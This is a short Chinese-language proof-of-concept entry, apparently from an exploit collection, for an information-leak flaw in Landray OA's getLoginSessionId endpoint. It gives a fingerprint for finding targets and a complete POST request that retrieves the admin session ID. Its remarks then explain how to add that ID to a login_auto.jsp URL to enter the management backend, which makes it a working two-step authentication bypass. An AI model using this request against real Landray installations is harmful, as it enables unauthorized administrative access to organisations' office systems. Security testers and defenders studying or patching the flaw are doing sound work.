﻿# 蓝凌OA存在getLoginSessionId 信息泄露漏洞

> 更新时间：2024-04-30

> 漏洞编号：

> 漏洞说明：蓝凌OA存在getLoginSessionId信息泄露漏洞泄露session信息，导致攻击者可利用此漏洞进入到管理后台。

> 漏洞特征：app="Landray-OA系统"

> 验证脚本：HTTP

```
POST /api///sys-authentication/loginService/getLoginSessionId HTTP/1.1
Cookie: JSESSIONID=97C4A7E395765306FB923C3C7FB7DB42
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Content-Encoding: deflate
Content-Disposition: attachment; filename="filename.jpg"
Content-Type: application/x-www-form-urlencoded
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive

loginName=admin
```

> 响应代码特征：200

> 响应内容特征：sessionId

> 上传文件定位：

> 验证文件来源：蓝凌OA存在getLoginSessionId 信息泄露漏洞.poc

```
备注说明：
1.先用以上请求获取获取SessionId
2.把获取到的sessionId进行拼接url地址，访问后即可登录到平台
GET /sys/authentication/sso/login_auto.jsp?sessionId=sessionId HTTP/1.1
```